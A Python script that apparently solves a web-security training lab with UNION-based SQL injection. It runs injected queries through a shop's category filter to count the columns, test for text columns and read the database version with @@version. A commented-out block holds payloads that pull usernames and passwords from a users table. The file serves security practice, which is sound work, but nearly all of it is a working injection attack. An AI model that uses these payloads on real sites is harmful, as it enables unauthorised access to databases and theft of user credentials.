import requests
from bs4 import BeautifulSoup
import re


def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    if resp.status_code != 200:
        print(f'Error code {resp.status_code} with text: {resp.text}\n')
        return resp
    soup = BeautifulSoup(resp.text, 'html.parser')
    print(f"{soup.find_all('th')}\n")
    return resp

if __name__ == "__main__":
    site = "ac6b1f141e49fffa80000c7700b90047.web-security-academy.net"
    category = 'Pets'
    s = requests.Session()
    url = f'https://{site}'
    login_url = f'https://{site}/login'

    columns = 0

    for i in range(0, 10):
        pstring = f"{category}' UNION SELECT null"
        nstring = i * ",null"
        qstring = f'{pstring}{nstring} -- '
        resp = try_category(qstring)
        if resp.status_code == 200:
            columns = i + 1
            print(f'Number of columns: {columns}')
            break
    #confirm two text columns
    resp_two = try_category(f"{category}' UNION SELECT 'hello','hello' -- ")
    print(f'Resp_two: {resp_two.status_code}\n')

    resp_one = try_category(f"{category}' UNION SELECT @@version,null -- ")
    if resp_one.status_code == 200:
        print(f'Resp_one: {resp_one.status_code} and text\n{resp_one.text}\n')
    else:
        print(f'Resp_one failed, status code: {resp_one.status_code}\n')
    

"""    resp_one = try_category(f"{category}' UNION SELECT 'hello',null --")
    resp_two = try_category(f"{category}' UNION SELECT null,'hello' --")

    resp_one = try_category(f"{category}' UNION SELECT username,null FROM users --")
    resp_two = try_category(f"{category}' UNION SELECT password,null FROM users --")
    resp_three = try_category(f"{category}' UNION SELECT username||'~'||password,null FROM users --")

    if resp_one.status_code == 200:
        print(f'Resp_one: {resp_one.status_code} with text: {resp_one.text}\n')
    elif resp_two.status_code == 200:
        print(f'Resp_two: {resp_two.status_code} with text: {resp_two.text}\n')
    elif resp_two.status_code == 200:
        print(f'Resp_three: {resp_three.status_code} with text: {resp_three.text}\n')
    else:
        print("No valid string column found\n")
"""
